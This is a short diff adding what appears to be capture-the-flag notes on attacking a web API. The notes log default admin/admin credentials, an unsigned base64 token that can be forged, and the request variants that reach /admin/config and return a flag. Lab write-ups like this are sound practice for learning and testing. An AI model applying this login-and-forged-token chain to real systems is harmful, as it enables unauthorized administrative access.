@@ -1,0 +1,10 @@
+POST /login {"user":"admin","pass":"admin"} -> 200 {"token": "eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=", "uid": "2"}
+GET /login (anonymous) -> {"token": "eyJ1aWQiOiAiMSIsICJ1c2VyIjogIiJ9", "uid": "1"}
+Token decodes (base64) to: {"uid": "2", "user": "admin"}  — unsigned, forgeable.
+
+GET /admin/config (no auth) -> 403 {"error": "admin only"}
+GET /admin/config -H "X-Token: <token>" -> 403 {"error": "admin only"}
+GET /admin/config?token=<token> -> 200 {"flag": "FLAG{api_chain_ok}", "debug": true}
+GET /admin/config -H "Authorization: Bearer <token>" -> 200 {"flag": "FLAG{api_chain_ok}", "debug": true}
+
+Full chain: login -> base64 token with user=admin -> Authorization: Bearer / ?token= -> admin/config.
